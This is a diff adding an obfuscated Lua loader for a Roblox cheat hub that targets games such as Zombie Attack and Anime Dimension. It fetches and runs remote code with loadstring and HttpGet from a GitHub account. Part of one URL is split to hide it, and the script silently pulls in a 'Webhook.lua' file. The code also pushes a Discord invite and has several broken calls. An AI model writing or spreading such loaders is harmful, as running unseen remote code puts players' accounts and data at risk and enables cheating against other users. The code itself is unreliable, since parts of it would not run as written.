@@ -1,0 +1,61 @@
+B_107 = game
+B_426 = B_107.PlaceId
+B_423 = "place"
+B_444 = "Market"..B_423.."Service"
+local B_424 = B_107:GetService(B_444):GetProductInfo(B_426);
+local B_425 = B_424.Name
+B_101 = "Function"
+B_103 = "Bindable"..B_101
+local B_100 = Instance.new(B_103)
+function B_105(b)
+    OnInvoke(b)
+end
+B_431 = ".lua"
+B_430 = "AllMap"
+B_435 = game:GetService("Workspace")
+B_428 = "Toonza555"
+function B_102(v)
+    SetCore(v)
+end
+function B_427(B_429)
+    loadstring(B_429)()
+end
+
+function B_111(B_222)
+    B_427(B_107:HttpGet("https://raw.git"..B_222.."usercontent.com/"..B_428.."/BONKHUB/main/"..B_430.."/Webhook.lua"))()
+end
+
+function B_100.OnInvoke(B_106)
+    if B_106 == "Copy Link Discord" then
+        setclipboard("https://discord.com/invite/VxSYTWBXWm")
+        wait(.5)
+        B_107.StarterGui:B_102("SendNotification", {
+            Title = "Notify !"; 
+            Text = "Link Coppid ! | Thanks for join";
+            Icon = "rbxassetid://11262159835";
+            Duration = 5; 
+        })
+    end
+end
+
+local function B_104()
+    B_107.StarterGui:SetCore("SendNotification", {
+        Title = "Notify !";
+        Text = "Please Join Discord";
+        Icon = "rbxassetid://11262159835";
+        Duration = 500; 
+        Button1 = "Copy Link Discord"; 
+        Callback = B_103;
+    })
+end
+
+B_104()
+B_111("hub")
+
+if B_426 == 1240123653 or string.find(B_425,"Zombie Attack") then -- Zombie Attack
+    B_427(B_107:HttpGet("https://raw.githubusercontent.com/"..B_428.."/BONKHUB/main/"..B_430.."/ZombieAttack"..B_431))()
+elseif B_426 == 6938803436 or B_426 ~= 6938803436 and string.find(B_425,"Dimension") then -- Anime Dimension    
+    B_427(B_107:HttpGet("https://raw.githubusercontent.com/"..B_428.."/BONKHUB/main/"..B_430.."/AnimeDimension"..B_431))()
+
+
+end
